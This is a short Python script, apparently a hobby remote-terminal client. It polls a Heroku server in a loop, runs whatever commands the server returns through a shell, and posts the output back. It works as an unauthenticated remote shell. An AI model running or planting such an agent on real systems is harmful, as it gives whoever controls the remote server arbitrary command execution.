import subprocess
import requests
import time

server = "https://remote-terminal-mrahuja.herokuapp.com"
def update_status(session_id, data):
    r = requests.post(server + "/command_response/" +str(session_id), json = {"command_output":str(data)})
    print(r.json())

while True:
    r = requests.get(server + "/get_all_commands")
    data = r.json()
    for session in data["sessions"]:
        try:
            output = subprocess.check_output(session["command"], shell=True, stderr=subprocess.STDOUT)
            out = output.decode()
            update_status(session["session_id"],out if out != "" else "Done")
        except subprocess.CalledProcessError as e:
            update_status(session["session_id"],e.output.decode())
    time.sleep(2)
